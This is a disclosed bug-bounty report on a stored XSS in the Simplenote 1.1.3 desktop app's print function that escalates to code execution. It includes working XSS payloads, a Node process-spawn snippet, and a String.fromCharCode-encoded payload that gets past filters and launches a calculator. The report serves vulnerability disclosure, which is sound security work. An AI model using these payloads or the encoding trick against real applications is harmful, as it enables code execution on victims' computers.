# RCE via Print function [Simplenote 1.1.3 - Desktop app] 

## Report Details
- **Report ID**: 358049
- **URL**: https://hackerone.com/reports/358049
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-05-27T09:33:36.011Z
- **Disclosed**: 2018-07-26T08:26:07.139Z

## Reporter
- **Username**: luigigubello
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
In **Simplenote 1.1.3 - Desktop app** there is a stored XSS vulnerability that can be used to execute arbitrary code. If there is malicious code in the note and the user tries to print it (for example to save it as a PDF), the malicious code runs.

This report is based on the [report **#291539**](https://hackerone.com/reports/291539), by Yasin Soliman (ysx). I used his code to pass from XSS to RCE.

# Step to reproduce

## 1 - Prerequisites

- Download and install Simplenote 1.1.3 Desktop app (I use Debian, but I think the problem is present on all desktop versions)
- Markdown must **not** be enabled

## 2 - Stored XSS

Create a new note, and you write this text:
```
">'><details/open/ontoggle=confirm('XSS')>
```
Now go to **File** --> **Print**. An alert box appears, so there is a XSS vulnerability and the code runs when the user tries to print the note.

## 3 - From XSS to RCE

Thanks to [**ysx**] (https://hackerone.com/ysx), I used the code in his proof-of-concept.
The code to open the Gnome calculator in Debian is:

```
var Process = process.binding('process_wrap').Process;
var proc = new Process();
proc.onexit = function(a,b) {};
var env = process.env;
var env_ = [];
for (var key in env) env_.push(key+'='+env[key]);
proc.spawn({file:'/usr/bin/gnome-calculator',cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});
```

Now you use the functions `writeln()` and `String.fromCharCode()` to bypass possible filters. So you [encode] (https://www.martineve.com/2007/05/15/javascript-eval-string-fromcharcode-encoder) the script into unicode values. Now you can create the payload:

```
">'><img src=x onerror=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,10,118,97,114,32,80,114,111,99,101,115,115,32,61,32,112,114,111,99,101,115,115,46,98,105,110,100,105,110,103,40,39,112,114,111,99,101,115,115,95,119,114,97,112,39,41,46,80,114,111,99,101,115,115,59,10,118,97,114,32,112,114,111,99,32,61,32,110,101,119,32,80,114,111,99,101,115,115,40,41,59,10,112,114,111,99,46,111,110,101,120,105,116,32,61,32,102,117,110,99,116,105,111,110,40,97,44,98,41,32,123,125,59,10,118,97,114,32,101,110,118,32,61,32,112,114,111,99,101,115,115,46,101,110,118,59,10,118,97,114,32,101,110,118,95,32,61,32,91,93,59,10,102,111,114,32,40,118,97,114,32,107,101,121,32,105,110,32,101,110,118,41,32,101,110,118,95,46,112,117,115,104,40,107,101,121,43,39,61,39,43,101,110,118,91,107,101,121,93,41,59,10,112,114,111,99,46,115,112,97,119,110,40,123,102,105,108,101,58,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,99,119,100,58,110,117,108,108,44,119,105,110,100,111,119,115,86,101,114,98,97,116,105,109,65,114,103,117,109,101,110,116,115,58,102,97,108,115,101,44,100,101,116,97,99,104,101,100,58,102,97,108,115,101,44,101,110,118,80,97,105,114,115,58,101,110,118,95,44,115,116,100,105,111,58,91,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,93,125,41,59,10,60,47,115,99,114,105,112,116,62))>
```

You write it in a note, then you print it (or save like pdf). The Gnome calculator will open.

I have attached two screenshots and a proof-of-concept video.

## Impact

An attacker can create a note with malicious code. Then he can share it with the victim, asking to print it or save it in pdf (it may be useful to have a pdf file) so the code is executed on the victim's computer.

## Attachments
- simplenote_rce_screen.png
- simplenote_rce_poc.mp4
- simplenote_rce_screen2.png
